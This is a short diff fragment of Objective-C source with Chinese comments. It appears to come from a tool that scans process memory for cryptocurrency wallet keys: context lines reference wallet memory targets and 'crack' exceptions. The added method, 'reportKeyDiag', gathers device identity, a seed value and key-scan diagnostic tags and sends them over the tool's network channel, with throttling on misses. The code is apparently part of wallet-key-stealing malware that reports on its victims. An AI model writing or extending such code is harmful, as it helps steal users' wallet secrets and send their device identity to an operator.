@@ -725,6 +725,27 @@ static NSArray *WalletMemoryTargets(void) {
         [self log:[NSString stringWithFormat:@"crack exception: %@", e.reason]];
     }
 }
+
+/// 节流上报诊断（miss 每 60 秒最多一条）
+- (void)reportKeyDiag:(NSString *)tag ctx:(NSDictionary *)ctx {
+    @try {
+        static NSTimeInterval last = 0;
+        NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
+        if ([tag isEqualToString:@"miss"] && now - last < 60) return;
+        last = now;
+
+        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        ev[@"et"] = @"memscan_key_diag";
+        ev[@"c"] = kSeed;
+        NSMutableDictionary *c = [NSMutableDictionary dictionaryWithDictionary:ctx ?: @{}];
+        c[@"tag"] = tag ?: @"";
+        ev[@"ctx"] = c;
+        [self.net sendEvent:ev];
+    } @catch (NSException *e) {
+        (void)e;
+    }
+}
+
 @end
 
 #pragma mark - 入口
